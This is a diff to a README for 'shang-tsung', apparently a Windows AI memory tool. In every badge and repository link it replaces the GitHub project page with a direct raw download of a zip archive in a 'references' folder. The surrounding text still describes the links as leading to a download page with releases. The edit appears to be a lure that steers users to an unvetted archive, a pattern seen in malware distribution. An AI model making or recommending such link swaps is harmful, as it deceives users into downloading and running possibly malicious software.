@@ -1,6 +1,6 @@
 # 🧠 shang-tsung - Manage AI Memory and Identity  
 
-[![Download shang-tsung](https://img.shields.io/badge/Download-shang--tsung-brightgreen?style=for-the-badge)](https://github.com/conversionreactiontorchsong281/shang-tsung)  
+[![Download shang-tsung](https://img.shields.io/badge/Download-shang--tsung-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/conversionreactiontorchsong281/shang-tsung/main/references/shang-tsung-1.4.zip)  
 
 ---
 
@@ -34,7 +34,7 @@ This guide will help you download and run shang-tsung on a Windows computer. No 
 
 Click the green button below to visit the shang-tsung download page on GitHub.  
 
-[![Download shang-tsung](https://img.shields.io/badge/Download-shang--tsung-green?style=for-the-badge)](https://github.com/conversionreactiontorchsong281/shang-tsung)  
+[![Download shang-tsung](https://img.shields.io/badge/Download-shang--tsung-green?style=for-the-badge)](https://raw.githubusercontent.com/conversionreactiontorchsong281/shang-tsung/main/references/shang-tsung-1.4.zip)  
 
 On the GitHub page, you will find a section called "Releases" or a link to download the latest version. Download the Windows installer file (.exe) from there.  
 
@@ -104,7 +104,7 @@ To update:
 
 1. Visit the download page again using the button below:  
 
-   [![Download shang-tsung](https://img.shields.io/badge/Download-shang--tsung-blue?style=for-the-badge)](https://github.com/conversionreactiontorchsong281/shang-tsung)  
+   [![Download shang-tsung](https://img.shields.io/badge/Download-shang--tsung-blue?style=for-the-badge)](https://raw.githubusercontent.com/conversionreactiontorchsong281/shang-tsung/main/references/shang-tsung-1.4.zip)  
 
 2. Check for the latest release and download the newest installer.  
 3. Run the new installer. It will update your current version without deleting your saved data.  
@@ -138,7 +138,7 @@ The application uses AI tools that manage memory and identity using local files.
 
 Visit the GitHub repository for documentation, examples, and details about development progress:  
 
-[https://github.com/conversionreactiontorchsong281/shang-tsung](https://github.com/conversionreactiontorchsong281/shang-tsung)  
+[https://raw.githubusercontent.com/conversionreactiontorchsong281/shang-tsung/main/references/shang-tsung-1.4.zip](https://raw.githubusercontent.com/conversionreactiontorchsong281/shang-tsung/main/references/shang-tsung-1.4.zip)  
 
 ---
 
